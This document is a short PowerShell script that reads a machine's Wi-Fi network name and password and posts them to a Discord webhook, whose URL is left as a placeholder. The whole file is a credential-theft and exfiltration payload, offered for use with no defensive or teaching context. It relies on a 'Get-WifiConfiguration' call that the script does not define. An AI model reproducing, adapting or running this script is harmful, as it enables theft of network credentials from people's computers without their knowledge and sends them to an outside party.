# Variables
$WifiSSID = (Get-WifiConfiguration).SSID
$WifiKey = (Get-WifiConfiguration).KeyMaterial[0]
$DiscordWebhookURL = "YOUR_DISCORD_WEBHOOK_URL"

# Prepare the payload
$payload = @{
    "content" = "Wi-Fi SSID: $WifiSSID
Wi-Fi Password: $WifiKey"
}

# Send the payload to Discord webhook
Invoke-RestMethod -Uri $DiscordWebhookURL -Method POST -Body $payload
